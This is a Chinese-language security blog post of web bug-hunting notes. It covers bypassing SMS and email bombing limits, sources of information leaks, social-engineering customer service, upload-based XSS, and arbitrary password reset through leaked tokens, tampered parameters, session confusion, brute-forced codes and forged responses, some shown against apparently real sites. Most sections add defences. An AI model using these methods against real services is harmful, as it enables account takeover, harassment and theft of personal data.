+<p>前面说到了关于加空格的绕过限制，邮箱也可以用，但还有一种方式可以绕过邮箱轰炸限制，那就是通过修改大小写，通过修改邮箱后面字母的大小写就可绕过限制，比如参数是这样的：Email=XXXX@qq.com  当次数达到限制时，随便修改一个字母为大写：Email=XXXX@Qq.com就可绕过限制。</p>
+<p><strong>0x06   修改返回值绕过短信&amp;邮箱轰炸限制</strong></p>
+<p>比如发送成功后返回值是success，发送失败的返回值是error，那么当达到次数后，可以通过修改返回值为正确的返回值：success，从而绕过限制，达到发送成功的目的</p>
+<p><strong>0x07   利用不同账户达到短信&amp;邮箱轰炸</strong></p>
+<p>这也算是一个绕过问题，主要也是验证不当，比如一个账户可以获取5次，那么我换一个账户又可以获取5次，没有其它验证，那么可导致大规模的短信轰炸，虽然轰炸次数少，但是确实是大规模的，其本质也是会对企业和用户造成影响。</p>
+<p><strong>直接造成短信&amp;邮箱轰炸的思路</strong></p>
+<p><strong>0x01   利用登录处达到短信轰炸</strong></p>
+<p>输入正确账户正确网站验证码以及等等，登录时抓包，然后利用这个登录成功的数据包，修改值就可达到绕过轰炸现在问题。</p>
+<p><strong>0x02   利用注册处&amp;找回密码处进行轰炸</strong></p>
+<p>在注册和找回密码处，往往都需要验证码，如果没有加以验证码以及其它的限制的话，有可能会造成轰炸问题。</p>
+<p><strong>0x03   利用修改处进行轰炸</strong></p>
+<p>在个人管理界面修改手机号或者修改邮箱的时候都需要验证码，如果此时这里处理不当，也可造成轰炸问题。</p>
+<p><strong>0x04   利用反馈处进行轰炸</strong></p>
+<p>一些平台支持反馈或者投诉等等，手机号或者邮箱都是自定义，也就是说可以随便输入，在我以前挖掘的过程当中，该问题利用起来虽然很有限制，但是本质上还是存在一点问题。一般这些反馈功能都不会验证提交次数，那么可以进行批量的提交，而手机号或邮箱可以指定需要轰炸的对象，当后台审核后就会进行短信或者邮箱通知，此时当你提交多少次就会通知多少次，那么也就造成了危害</p>
+<p>在个人管理界面修改手机号或者修改邮箱的时候都需要验证码，如果此时这里处理不当，也可造成轰炸问题。</p>
+<p><strong>0x05   利用某些活动页面进行轰炸</strong></p>
+<p>比如一些活动或者刚上线的广告，可以领取某某东西，要求获取手机验证码进行领取，一般这里最容易存在问题了，如果最后活动下线了而这个发送接口还存在的话，那么就可被更隐藏性的利用了。</p>
+<p><strong>0x06   利用独特功能进行轰炸</strong></p>
+<p>比如个人后台可以添加企业资料或者什么的，然后里面会要求输入手机号，当添加成功了会有短信通知，此时如果重复添加，那么添加一次通知一次也就造成了短信轰炸的危害了。</p>
+<h1 id="信息泄露之总结"><a href="#信息泄露之总结" class="headerlink" title="信息泄露之总结"></a>信息泄露之总结</h1><p><strong>Web方面的信息泄露</strong></p>
+<p><strong>0x01  用户信息泄露</strong></p>
+<p>①：评论处</p>
+<ul>
+<li>一般用户评论处用户的信息都是加密的，比如显示的是用户手机号或邮箱等，就会直接对中间的一段数字进行加密，但是有些可能就没有加密，而是直接显示出来，那么这就造成了用户信息泄露问题。</li>
+<li>如果加密不当，直接游览用户评论处时进行抓包，然后查看返回包就可以直接看到明文，但有的时候会有2个参数，就比如<code>name：1333******1</code>这个值是加密的，但后面还会有一个<code>testname</code>这个参数就没有进行加密，从而导致用户信息泄露。这里有一些小技巧，就比如一个买卖市场，他有用户评论的地方，有一个秒杀抢购成功的展示用户的地方，还有一个是用户相互交流的地方，一般白帽子测试了第一个功能处发现不存在问题，然后就不继续测试其它相同功能处了，这个疏忽就可能会导致错过一个发现问题的机会，每个功能处，加密机制有时候就会被漏掉，就比如用户评论处用户信息加了密，但是秒杀抢购成功的展示用户的地方却没有加密，所以白帽子要更细心点。</li>
+<li>一般评论处都会有一个追加评论功能和一个商家回复功能，那么此时如果对这个功能参数没有加以加密，那么通过抓包游览<code>查看返回包</code>就可看到追加评论的用户信息和商家信息。</li>
+<li>有些评论功能当中支持<code>艾特(@)他人</code>，那么在这个评论当中你通过@他人，然后输入信息点击发送到评论处时，通关抓包就可看到刚刚@的那个用户的明文信息。</li>
+<li>当这个网站评论地方被搜索引擎爬虫到了，那么可以尝试利用搜索命令site:XXXX.com      inurl:XX目录在搜索引擎当中搜索，如果加密不完全，那么就可以在搜索引擎当中看到明文信息。<br>关于这类的信息泄露问题我找到了相关例子：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0104766.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0104766.html</a></li>
+</ul>
+<p>②：转账处</p>
+<ul>
+<li>很多大型公司都有自家的金融平台，然后在转账处，当你输入对方的转账的账户，比如手机号或者邮箱，然后当你点击其它地方，它会向服务器发送一条验证信息，验证输入的此账户是否存在，如果存在，返回对应的手机号或者邮箱账户的用户姓名，比如*王（1333333XXX）这样的返回信息，那么如果此时前端加密不当，可以通过抓包拦截这条请求，查看返回信息，就可看到明文的姓名。<br>关于这类问题，我找到了相关例子：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0124969.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0124969.html</a></li>
+<li>一般在转账处输入手机号或邮箱账户的旁边，有一个历史转账信息，一个迷你的小页面，当你点击后会看到之前转账成功的信息，但是，如果此页面加密不全，那么在点击查看历史转账信息时直接抓包查看返回内容就可看到明文的姓名。</li>
+</ul>
+<p>③：搜索处</p>
+<ul>
+<li>有些平台内置了搜索功能，跟搜索引擎思路很像，同样也是随意搜索，如果此时搜索的结果包含用户信息这块，那么就可能会导致用户信息泄露问题。关于这类问题，我找到了相关例子：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-069909.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-069909.html</a></li>
+</ul>
+<p>④：个人页面处</p>
+<ul>
+<li>在个人页面当中，直接游览时直接抓包，查看返回包就可看到用户信息是否未加密完全。比如一些金融APP，如果加密不当，当点击个人界面时通过抓包查看返回包就可看到明文的身份证信息和用户名以及手机号。<pre><code>当然这里不是只有涉及金融APP方面的才会有这个问题，只要是可以查看个人页面处都可能存在。</code></pre></li>
+<li>在查看银行卡信息那里，一般都是加了密的，但查看银行卡信息处时进行抓包查看返回包的时候就可看到明文的银行卡卡号信息和姓名信息。</li>
+</ul>
+<p>⑤：客服处</p>
+<ul>
+<li>这个问题属于客服安全方面意思不足，大一点的来看就是公司没有对客服进行安全培训等，当你询问客服某手机号对应的姓名时，客服就会直接把姓名发你，当然这要考验你是怎么问的了，还有如果失败了不要放弃，换一个客服继续测试。</li>
+</ul>
+<p>越权方面的用户信息泄露</p>
+<p>①：任意查看</p>
+<ul>
+<li>很多平台需要进行实名制认证，在上传实名制所需要的身份证照片等信息图片时，如果没有对所产生的文件名格式进行复杂化的话，那么极有可能会存在任意查看，通过批量的方式就可以进行这些步骤，比如你上传了图片，服务器生成的图片地址是XXX.com/xxx/xx/012313.jpg这样短的数字格式文件名的话，就会存在该问题。</li>
+<li>购物平台当中，在添加地址或修改地址的地方，如果权限没过滤好，就可以越权进行查看任意用户的地址信息。</li>
+<li>在某些平台当中，支持添加子账户，然后随便添加一个子账户，然后在查看该子账户的时候进行抓包，修改其ID值，就可以查看任意账户信息</li>
+<li>有些平台有操作日志或其它日志功能，那么如果此时对当前用户的权限过滤不当，那么就可以查看全部用户操作时产生的日志，从而导致信息泄露。</li>
+<li>在很多金融平台当中，在修改昵称那里或者查看个人信息那里，提交时抓包，修改其用户值为存在用户的任意值，那么就可能造成查看任意用户信息的问题。</li>
+<li>如果你进入了一些内部员工平台，那么如果具有搜索功能，就比如你输入了员工工号然后它会返回这个员工的所有在职信息，那么此时你可以通过抓包批量进行提交员工工号，就可造成大范围的信息泄露。</li>
+<li>随便买一个东西生成订单，如果此时权限控制不当，就可以越权查看到任意用户的订单，那么信息也自认而然的泄露出来了。<pre><code>关于这方面，我找到了相关例子：http://wooyun.jozxing.cc/static/bugs/wooyun-2014-083157.html</code></pre></li>
+</ul>
+<p>②：任意重置</p>
+<ul>
+<li>如果权限控制不当，可导致任意用户密码修改的话，那么登录后就可查看该用户的任意信息，这也就导致了用户信息泄露。</li>
+</ul>
+<p>③：任意修改</p>
+<ul>
+<li>在下单的时候修改其用户ID为任意存在用户的ID，然后下单，然后查看刚刚下单的信息，就可看到该用户的收货地址信息，只要对方设置了收货地址。</li>
+</ul>
+<p>接口方面的用户信息泄露</p>
+<ul>
+<li>很多业务网站在上线的时候都忘记把测试时的接口进行关闭，从而导致这个接口可以查询大量用户信息。那么此类接口怎么找呢？<pre><code>其中之一的方法通过Github.com网站进行搜索相关域名进行查找。
+     关于这类问题，我找到了相关例子：http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0116563.html</code></pre></li>
+</ul>
+<p>注入方面的用户信息泄露</p>
+<ul>
+<li><p>注入可以说是非常非常的严重，因为注入往往都能得到很多信息，如果没做好相关过滤以及防护，就可导致注入，从而数据库内的各种数据面对裸露的危险。</p>
+<p><strong>以上就是关于挖掘用户信息泄露方向的思路了，我试着努力回想，但目前只能总结到这几个点，如果还有更多思路，欢迎在评论处留言！</strong></p>
+</li>
+</ul>
+<p> <strong>0x02  服务器路径信息泄露</strong></p>
+<p>①：上传图片处</p>
+<ul>
+<li>在上传图片处，这里我说下最可能存在问题的点，就是关于上传相关证明，进行实名制上传信息等功能页面，在上传图片时进行抓包，然后查看返回包，那么就可看到当前服务器的绝对路径信息。</li>
+</ul>
+<p>②：XML处</p>
+<ul>
+<li>一些XML限制或删除不完全，可导致服务器等信息泄露。<pre><code>详细例子:http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0123762.html</code></pre></li>
+</ul>
+<p>③：第三方的服务当中</p>
+<ul>
+<li>很多，如：Apache      Tomcat、Struts2、CMS、zabbix、Nginx等等，例如Nginx的某版本解析漏洞，就可造成路径信息泄露。<pre><code>关于这方面我找到了相关例子:
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2013-019253.html&gt;
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2012-04655.html&gt;</code></pre></li>
+</ul>
+<p>④：利用报错问题</p>
+<ul>
+<li><p>在处理报错信息的问题上如果处理不当，就可导致路径信息泄露，比如访问一些不存在的文件等思路。</p>
+<pre><code>这里我找到了相关例子：
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2012-010115.html&gt;
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02219.html&gt;
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2012-09901.html&gt;</code></pre><p><strong>以上就是关于服务器路径信息泄露问题！</strong></p>
+</li>
+</ul>
+<p> <strong>0x03  员工信息泄露</strong></p>
+<p>①：各第三方平台当中</p>
+<ul>
+<li>Github，很不错的开源社区平台。一些员工喜欢将自己的信息上传到这平台上，但是往往忽视了安全，有时这上传的代码当中就可能包含很多内部测试员工的账户以及密码信息等。<pre><code>关于这方面我找到了相关例子：
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0177720.html&gt;
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0164337.html&gt;</code></pre></li>
+<li>在搜索QQ群那里，通过搜索企业昵称，往往都可以搜索出来关于企业员工或企业方面的信息，一般都会贴在公告当中，比如某某测试账户等。<pre><code>当然，你也可以申请加入群进行查看群文件，看是否有铭感的信息。
+这里我找到了相关例子：
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0128511.html&gt;
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2015-093927.html&gt;
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0208105.html&gt;</code></pre></li>
+<li>百度贴吧当中，一般都有公司员工创建的贴吧，如果安全意思不足，那么就会泄露相关员工工号，可用作暴力破解的字典。</li>
+</ul>
+<p>②：弱密码问题</p>
+<ul>
+<li><p>在一些涉及内部员工方面的系统，如果员工密码为弱密码，那么就可通过暴力破解方式进行尝试登录，如果成功爆破到了员工账户，那么一般只要是内部员工系统该账户都可以登录，那么所造成的影响也是很大的。</p>
+<p><strong>以上就是关于员工信息泄露的问题！</strong></p>
+</li>
+</ul>
+<p><strong>0x04  数据库信息以及服务器信息泄露</strong></p>
+<p>①：各第三方平台当中</p>
+<ul>
+<li>Github，一些员工如果安全意识不足，同样上传的代码当中就包含了数据库连接信息以及服务器信息。<pre><code>关于这类问题，我找到了相关例子：http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0180848.html</code></pre></li>
+<li>利用搜索QQ群的思路，如果员工的安全意识不足，那么数据库连接信息以及服务器信息就会在公告或群文件当中</li>
+</ul>
+<p>②：XML处</p>
+<ul>
+<li>同样在XML文件当中，也可能会发现数据库连接信息以及服务器信息。</li>
+</ul>
+<p>③：svn处</p>
+<ul>
+<li>svn是一个开放源代码的版本控制系统，如果没有加以限制或者删除，那么就可以游览相关的比较隐蔽性的源码。<pre><code>关于这类的问题，我找到了相关例子：
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0199607.html&gt;
+&lt;http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191202.html&gt;</code></pre></li>
+</ul>
+<p>④：数据库文件</p>
+<ul>
+<li>一些数据库相关文件如果删除不当或者摆放位置不当，那么极有可能被下载下来，造成危害。<pre><code>关于这方面，我找到了相关例子：http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0158556.html</code></pre></li>
+</ul>
+<p>⑤：其它文件</p>
+<ul>
+<li>比如其它类型的文件，如Txt、Doc、Excel等文件，如果包含铭感信息，那么危害也是显而易见的。</li>
+</ul>
+<p><strong>以上就是关于数据库信息以及服务器信息泄露的问题！</strong></p>
+<p><strong>APP方面的信息泄露</strong></p>
+<p><strong>0x01 敏感域名泄露</strong></p>
+<p>①：本地文件当中</p>
+<p>第一点：</p>
+<p>一些比较隐私性的域名可能会包含在APP本地文件当中，比如某内部员工登录系统的APP，但是由于有证书校验，你也抓不到数据包，此时你可以查看该APP的本地文件，然后就可看到本APP内调用的是哪些域名，然后还有相关的域名。</p>
+<p>从APP内提取域名的相关程序很多，Github很多，这里我提供一个某作者写的Windows下的工具吧，需要Net环境哦，下载地址：</p>
+<p><a href="https://pan.baidu.com/s/1slJaYnF" target="_blank" rel="noopener">https://pan.baidu.com/s/1slJaYnF</a></p>
+<p> <strong>0x02 密码泄露</strong></p>
+<ul>
+<li>手势密码也存在在本地文件当中，如果没最好相关校验或加密，那么手势密码就可能会泄露并且被利用。</li>
+<li>一些APP问题就是把用户登录的信息保存在本地，而且账户密码都是以明文保存在本地文件或本地Sqlite数据库当中，很容易被利用。<pre><code>这里我找到了类似的例子：http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02915.html</code></pre></li>
+<li>同样，一些APP也会把登录成功的Cookie保存在本地，那么只要找到相关文件复制下来这个Cookie，就可以任意登录了。</li>
+</ul>
+<p>当然，访问这些文件是<strong>需要ROOT权限</strong>的，以上就是APP方面的信息泄露问题了！</p>
+<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传"></a>图片上传</h1><p><strong>修改img url</strong></p>
+<p>图片上传处，图片的url可控，设置为自己的vps。在vps查看访问记录，证明后台人员触发img标签，成功控制http请求。这里的触发应该是后台人员查看这我的图片。。我们可以根据这个漏洞使用401钓鱼手法，获取到后台人员的referer。或者我们可以构造dos靶机，结合csrf所有访问该网站的人访问dos的攻击目标造成dos。<br><a href="https://secvul.com/topics/924.html" target="_blank" rel="noopener">https://secvul.com/topics/924.html</a></p>
+<p><strong>oss对象存储上传</strong></p>
+<p>无论上传什么类型的后缀文件时候，捕获数据包，将content-type类型修改为“text/html”，然后打开上传后的文件地址，可以触发xss<br><a href="https://xz.aliyun.com/t/2078" target="_blank" rel="noopener">https://xz.aliyun.com/t/2078</a></p>
+<h1 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h1><p><strong>有key1 key2 加密的情况下重置密码</strong></p>
+<p>key1是用户标志<br>key2是类似于验证码的密文<br>使用两个账号重置密码，第一个账号重置时得到他的key1 key2<br>第二个账号重置密码的时候，替换账号1的key1，然后删除key2参数，重置成功。<br>关键字loan+fpwd1</p>
+<h2 id="任意用户密码重置（一）：重置凭证泄漏"><a href="#任意用户密码重置（一）：重置凭证泄漏" class="headerlink" title="任意用户密码重置（一）：重置凭证泄漏"></a>任意用户密码重置（一）：重置凭证泄漏</h2><p>用邮件找回密码时，带凭证的重置链接泄漏至客户端，抓捕可获取。用攻击者账号走一次密码找回流程。在找回密码页面输入攻击者账号及其邮箱（yangyangwithgnu、<a href="mailto:yangyangwithgnu@yeah.net" target="_blank" rel="noopener">yangyangwithgnu@yeah.net</a>）后提交：</p>
+<p>在点击找回密码的时候响应包为</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5mc6o9yj20fm0bcjtd.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5mgw3ndj20ip08sdj2.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5mku4vpj20j607xwhg.jpg" alt></p>
+<p>这个带 token 的重置链接似曾相识，对，就是前面抓包获取的 token 信息，比对看下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">forgotPwdEa.php?isVerify=eWFuZ3lhbmd3aXRoZ251fHlhbmd5YW5nd2l0aGdudUB5ZWFoLm5ldHw2MzQyNDkw&amp;PassPhrase=01e4f6d4ede81b2604dc320bc4e3a6e8</span><br><span class="line">forgotPwdEc.php?isVerify=eWFuZ3lhbmd3aXRoZ251fHlhbmd5YW5nd2l0aGdudUB5ZWFoLm5ldHw2MzQyNDkw&amp;PassPhrase=01e4f6d4ede81b2604dc320bc4e3a6e8</span><br></pre></td></tr></table></figure>
+
+<p>唯一区别 forgotPwdEa 和 forgotPwdEc 两个文件名。</p>
+<p>接下来验证通过服务端泄漏的 token 能否重置普通用户的账号密码。从重置流程可知，要重置密码必须提供用户名及其邮箱（或手机号）。</p>
+<p>获取有效用户名。注册页面中，输入用户名后立即校验该用户名是否被占用：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5oq22ryj20ee0eqwhz.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5ouf52pj20j608ajuc.jpg" alt></p>
+<p>可以此特征枚举有效用户名及其邮箱。现在考虑如何制作邮箱字典？很多用户喜欢用用户名注册 qq 邮箱，换言之，用户名 yangyangwithgnu 可能对应邮箱 <a href="mailto:yangyangwithgnu@qq.com" target="_blank" rel="noopener">yangyangwithgnu@qq.com</a>。所以，用前面已经获取有效用户名字典 username.txt 快速制作了邮箱字典 qq-email.txt，其中，username.txt 与 qq-email.txt 逐行对应。</p>
+<p>例如，前者第一行为 yangyangwithgnu、后者第一行为 <a href="mailto:yangyangwithgnu@qq.com" target="_blank" rel="noopener">yangyangwithgnu@qq.com</a>。将上面的数据包放入 burp 的 intrduer 中，攻击类型选 pitchfork、user_name 的参数值定义为枚举变量 1 并加载字典 username.txt、email 的参数值定义为枚举变量 2 并加载字典 qq-email.txt，可枚举出大量有效用户名/邮箱信息，如，zhangfeng/zhangfeng@qq.com、chenchuan/chenchuan@qq.com 等等。</p>
+<p>用普通账号 chenchuan/chenchuan@qq.com 演示密码重置漏洞。输入用户名、密码提交，正常完成密码找回逻辑，从交互包中获取服务端下发的重置 token：</p>
+<p>输入新密码 PenTest1024 后系统提示修改成功。用 chenchuan/PenTest1024 成功登录：</p>
+<p><strong>防御措施上，密码找回的凭证切勿下发客户端，另外，校验邮箱是否有效应添加图片验证码，以防止关键参数被枚举</strong></p>
+<h2 id="任意用户密码重置（二）：重置凭证接收端可篡改"><a href="#任意用户密码重置（二）：重置凭证接收端可篡改" class="headerlink" title="任意用户密码重置（二）：重置凭证接收端可篡改"></a>任意用户密码重置（二）：重置凭证接收端可篡改</h2><p><strong>请求包中包含接收端参数，可将凭证发至指定接收端。</strong></p>
+<p>密码重置页面，输入任意普通账号，选择手机方式找回密码。在身份验证页面点击获取短信验证码：</p>
+<p>拦截请求，发现接收验证码的手机号为请求包中的参数：</p>
+<p>直接篡改为攻击者的手机号，成功接收短信验证码，提交验证码后，正常执行 3、4 步即可成功重置该账号的密码。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5r9jxbvj20j609utcs.jpg" alt></p>
+<p>修改用户名重置他人账号密码</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f5t7ju6jj20gb0820v0.jpg" alt></p>
+<p><strong>防御措施方面，一定要将重置用户与接收重置凭证的手机号/邮箱作一致性比较，通常直接从服务端直接生成手机号/邮箱，不从客户端获取。</strong></p>
+<h2 id="任意用户密码重置（三）：用户混淆"><a href="#任意用户密码重置（三）：用户混淆" class="headerlink" title="任意用户密码重置（三）：用户混淆"></a>任意用户密码重置（三）：用户混淆</h2><p><strong>通过 cookie 混淆不同账号，实现重置任意用户密码</strong></p>
+<p>首先账号①走一遍找回密码的全部流程</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f4h3uaysj20ru0ciwh0.jpg" alt></p>
+<p>其中，<code>PHPSESSID=dcusc1ahkn4ioqeeav9c6e0bdq</code>、<code>USER_ACCOUNT=yangyangwithgnu</code>、 <code>USER_APPID=1092</code>这三个参数引起我的注意。这个请求，用于重置账号 yangyangwithgnu 密码，那么服务端如何知道该重置 yangyangwithgnu 而不是 yangyangwithgnu2、yangyangwithgnu3 呢？刚才说的那三个参数中肯定有一个用于该目的。逐一尝试发现，PHPSESSID 就是它。</p>
+<p>这让我闻到浓郁的 cookie 混淆的味道。大致攻击思路：首先，用攻击者账号 yangyangwithgnu 进入密码找回流程，查收重置验证码、通过校验；然后，输入新密码后提交，拦截中断该请求，暂不发至服务端，这时，PHPSESSID 关联的是 yangyangwithgnu 账号；接着，关闭浏览器的 burp 代理，新开重置流程的首页，在页面中输入普通账号 liuwei 后提交，这时，PHPSESSID 已关联成 liuwei 了；最后，恢复发送之前中断的请求，放至服务端，理论上，可以成功重置 liuwei 的密码。</p>
+<p>用上述思路尝试将 liuwei 密码重置为 PenTest1024，前端显示重置成功：</p>
+<p><strong>通过篡改请求包中的用户名参数，实现重置任意用户密码。</strong></p>
+<p>密码找回页面 <a href="http://www.xxxx.cn/getpass.html" target="_blank" rel="noopener">http://www.xxxx.cn/getpass.html</a>，用攻击者账号走完密码找回全流程，涉及三步请求，依次为：验证用户名是否存在、获取短信验证码、提交短信验证码和新密码。第三步的请求拦截如下：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f4lvf7e8j20j607mq7k.jpg" alt></p>
+<p>尝试将 accountname 参数值篡改为普通账号 zhangzhiqiang 后放行，应答为：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f4m275y4j20j604340r.jpg" alt></p>
+<p>重定向至登录页面。用普通账号 zhangzhiqiang/PenTest1024 登录成功。</p>
+<p><strong>通过篡改带 token 的重置链接中的用户名，实现重置任意用户密码。</strong></p>
+<p><a href="http://xx.xxxx.com/echannel/forgetPassword/" target="_blank" rel="noopener">http://xx.xxxx.com/echannel/forgetPassword/</a> 为重置密码页面。攻击者用户 ID 为 42558。</p>
+<p>输入攻击者账号绑定的邮箱后点击“确认”，收到如下带 token 的密码重置链接：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f4t3bbntj20j6062dhx.jpg" alt></p>
+<p>该重置链接有两个地方引起我的注意：一是，NDI1NTg= 为 base64 编码，解码为 42558，正是攻击者账号的用户 ID；二是，这是个 REST 风格的请求。所以，尝试用普通账号的用户 ID 的 base64 编码替换 NDI1NTg= 后，成功重置该普通用户的密码。</p>
+<p>特别注意，参数部份出现 / 应想到这是 rest 风格的参数和参数值。</p>
+<h2 id="任意用户密码重置（四）：重置凭证未校验"><a href="#任意用户密码重置（四）：重置凭证未校验" class="headerlink" title="任意用户密码重置（四）：重置凭证未校验"></a>任意用户密码重置（四）：重置凭证未校验</h2><p><strong>无效的token校验</strong></p>
+<p>一般邮箱找回密码会给邮箱发一条链接，链接带上token，但是有些网站的token形同虚设。<br>类似<a href="http://www.omegatravel.net/users/retrievePasswordReset/key:xxxxxx/userEmail:travel24@omegatravel.net，这里的key随便填依旧是可以找回密码" target="_blank" rel="noopener">http://www.omegatravel.net/users/retrievePasswordReset/key:xxxxxx/userEmail:travel24@omegatravel.net，这里的key随便填依旧是可以找回密码</a></p>
+<p><strong>可枚举无密保的用户名</strong></p>
+<p>在密码找回页面 <a href="http://www.hzpzs.net/u_findPassword.asp" target="_blank" rel="noopener">http://www.hzpzs.net/u_findPassword.asp</a> 输入有效用户名 yangyangwithgnu 后拦截请求包：<br>由于没用图片验证码，导致可枚举有效用户名，发现三类情况。<br>一是，用户名存在且设置过密保问题<br>二是，用户名存在但未设置密保问题<br>三是，无效用户名<br>用常见用户名和中国人姓名拼音作为字典进行枚举，在所有结果中过滤显示含有关键字<code>&lt;td width=&quot;65%&quot;&gt;&lt;/td&gt;</code>的应答，得到的所有 UserName 参数值即为未设置密保问题的用户名。如：aaron、admin、adolph、alisa、chenchen、esther、jones 等等。<br>按正常流程，对 chenxin 进行密码重置，输入任意密保答案均可重置密码：</p>
+<p><strong>防御：密码重置凭证一定要严格校验，空密保问题时禁止通过密保找回密码；服务端应限制枚举等恶意请求。</strong></p>
+<h2 id="任意用户密码重置（五）：重置凭证可暴破"><a href="#任意用户密码重置（五）：重置凭证可暴破" class="headerlink" title="任意用户密码重置（五）：重置凭证可暴破"></a>任意用户密码重置（五）：重置凭证可暴破</h2><p>密码找回页面 <a href="http://www.xxxx.com/find-pw.html" target="_blank" rel="noopener">http://www.xxxx.com/find-pw.html</a> 用攻击者账号 13908081024 进入密码找回全流程，输入图片验证码、选择手机找回、获取短信验证码，发现短信验证码为 4 位数字且短信内容上未看到有效期信息，所以，可暴破短信验证码，进行后续的重置流程。</p>
+<p>用账号枚举漏洞遍历得到的普通手机号 13908093346 为例，进入密码找回流程，提交短信验证码：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f615wzflj20j60jwjxt.jpg" alt></p>
+<p>爆破处验证码</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f61esiy5j20ii0aln1d.jpg" alt></p>
+<p><strong>加固措施密码重置凭证强度提高，建议六位数字，有效期十分钟，并且验证码应校验一次后立即作废。另外，服务端应限制枚举等恶意请求。</strong></p>
+<h2 id="任意用户密码重置（六）：应答中存在影响后续逻辑的状态参数"><a href="#任意用户密码重置（六）：应答中存在影响后续逻辑的状态参数" class="headerlink" title="任意用户密码重置（六）：应答中存在影响后续逻辑的状态参数"></a>任意用户密码重置（六）：应答中存在影响后续逻辑的状态参数</h2><p><strong>前端验证绕过</strong></p>
+<p>在密码找回页面 <a href="http://www.xx.cn/yy/action/forgot" target="_blank" rel="noopener">http://www.xx.cn/yy/action/forgot</a> 用攻击者手机号 13908081024 进入密码找回全流程，获取短信验证码 033128、输入图片验证码、输入短信验证码并提交：</p>
+<p>简单分析发现，校验通过时服务端并未向客户端<code>set-cookie</code>，猜测服务端并未记录校验状态，是否进入设置新密码页面完全是由前端 js 基于应答状态决定的，那么，即便我没有短信验证码，通过将服务端下发给客户端的校验状态从“失败”改为“成功”，也能成功重置找回账号密码。</p>
+<p>具体而言，以信息搜集时找到的客服手机号 13980808888 为例。输入手机号、获取短信验证码、输入图片验证码、输入错误的短信验证码 123123 后提交：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6aaqybfj20j607ago6.jpg" alt></p>
+<p>由于短信验证码错误，系统校验肯定失败，拦截该应答，用前面抓取校验成功的应答包替换之：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6apmn2rj20j606bwgj.jpg" alt></p>
+<p>放行至客户端，顺利进入新密码设置页面</p>
+<p><strong>案例二</strong></p>
+<p>在密码找回页面 <a href="http://www.xx.cn/yy/forgot" target="_blank" rel="noopener">http://www.xx.cn/yy/forgot</a> 用攻击者手机号 13908081024 进入密码找回全流程，获取短信验证码 2118、输入短信验证码并提交：</p>
+<p>服务端校验通过后，系统应答如下：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6eb1sqpj20cp07bab2.jpg" alt></p>
+<p>简单分析发现，校验通过时服务端并未向客户端 <code>set-cookie</code>，将服务端下发给客户端的校验状态 code 改为“0000”，可以重置其他用户密码。</p>
+<p>具体而言，以土豪手机号 13888888888 为例。输入手机号、获取短信验证码、输入错误的短信验证码 1234 后提交。由于短信验证码错误，服务端校验失败，应答如下：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6f9qwlbj20er06v3zg.jpg" alt></p>
+<p>拦截该应答，用前面抓取校验成功的应答包替换之后，放行至客户端，顺利进入新密码设置页面</p>
+<p><strong>防御：服务端校验短信验证码后应通过 cookie 记录状态，不应在前端通过状态参数判断。另外，服务端应限制枚举等恶意请求。</strong></p>
